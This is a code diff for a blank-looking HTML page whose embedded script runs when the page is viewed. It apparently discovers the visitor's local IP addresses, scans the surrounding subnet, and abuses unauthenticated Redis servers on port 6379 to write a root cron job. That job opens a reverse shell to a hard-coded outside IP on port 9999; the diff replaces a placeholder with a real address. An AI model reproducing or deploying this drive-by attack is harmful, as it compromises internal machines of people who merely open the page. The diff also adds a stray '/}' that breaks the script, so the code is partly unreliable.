@@ -1,3 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Document</title>
+</head>
+<body>
+ 
+</body>
+ <script>
+ 20171128 modify by zoe
 //得到账户关联的IP地址
 ipList = []
 function getIPs(callback) {
@@ -79,11 +90,11 @@ getIPs(function (ip) {
 		var iparr = ipList[i].split(".");
 		//for(var j=0; j<255; j++) {
 			 for(var i=1; i<255; i++) {
-				var attkip = iparr [0] + "." + iparr [1] + "." + iparr [2] + "." + i;
+				var attkip = iparr [0] + "." + iparr [1] + "." + iparr [2]  + "." + i;
 				//console.log(attkip);
 				send(attkip);
-				}
-			//}
+				/}
+			}
 		}
 	}
 		
@@ -93,7 +104,7 @@ function send(ip) {
 	var port= '6379';
 	var dir = '/var/spool/cron/';
 	var filename = 'root';
-	var content = '*/1 * * * * /bin/bash -i >& /dev/tcp/XX.XX.XX.XX/9999 0>&1';
+	var content = '*/1 * * * * /bin/bash -i >& /dev/tcp/47.93.4.61/9999 0>&1';
 	var url = "http://" + ip + ":" + port;
  
 	var cmd = new XMLHttpRequest();
@@ -105,3 +116,7 @@ function send(ip) {
 	cmd.send('save\r\n');
  
 }
+
+	
+	</script>
+</html>
